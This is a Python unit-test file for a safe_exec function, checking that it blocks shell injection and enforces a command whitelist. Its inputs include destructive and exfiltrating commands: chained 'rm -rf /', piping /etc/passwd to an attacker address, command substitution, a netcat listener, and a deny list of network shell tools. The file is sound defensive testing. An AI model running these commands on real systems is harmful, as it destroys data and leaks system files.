"""Tests for safe_exec command injection prevention."""

from unittest.mock import patch

from services.service_utils import ALLOWED_COMMANDS, safe_exec


class TestSafeExec:
    """Verify safe_exec blocks injection and enforces whitelist."""

    def test_allowed_command_runs(self):
        result = safe_exec("echo hello")
        assert result is not None
        result.wait()
        assert result.returncode == 0

    def test_empty_command_returns_none(self):
        assert safe_exec("") is None

    def test_whitespace_only_returns_none(self):
        assert safe_exec("   ") is None

    def test_unwhitelisted_command_blocked(self):
        assert safe_exec("rm -rf /") is None

    def test_shell_metacharacters_blocked(self):
        """Commands with shell metacharacters should be parsed as a single
        token (the whole string) which won't match any allowed command."""
        assert safe_exec("echo; rm -rf /") is None

    def test_pipe_blocked(self):
        assert safe_exec("cat /etc/passwd | mail attacker@evil.com") is None

    def test_command_substitution_blocked(self):
        assert safe_exec("echo $(whoami)") is None

    def test_backtick_substitution_blocked(self):
        assert safe_exec("echo `whoami`") is None

    def test_semicolon_chaining_blocked(self):
        assert safe_exec("echo hello; rm -rf /") is None

    def test_amperstand_chaining_blocked(self):
        assert safe_exec("echo hello && rm -rf /") is None

    def test_redirect_blocked(self):
        assert safe_exec("echo hello > /etc/passwd") is None

    def test_shell_true_not_used(self):
        """Verify we never pass shell=True to Popen."""
        with patch("subprocess.Popen") as mock_popen:
            mock_popen.return_value.wait.return_value = 0
            safe_exec("echo hello")
            call_kwargs = mock_popen.call_args
            # Should be called with a list, not a string
            assert isinstance(call_kwargs[0][0], list)

    def test_binary_not_in_allowed_list(self):
        assert safe_exec("nc -l 4444") is None

    def test_allowed_commands_set_is_not_empty(self):
        assert len(ALLOWED_COMMANDS) > 10

    def test_common_commands_allowed(self):
        for cmd in ["ls", "cat", "grep", "echo", "date", "whoami"]:
            assert cmd in ALLOWED_COMMANDS, f"{cmd} should be in ALLOWED_COMMANDS"

    def test_dangerous_commands_not_allowed(self):
        for cmd in ["rm", "dd", "mkfs", "nc", "ncat", "socat", "git", "gcc", "systemctl"]:
            assert cmd not in ALLOWED_COMMANDS, f"{cmd} should NOT be in ALLOWED_COMMANDS"
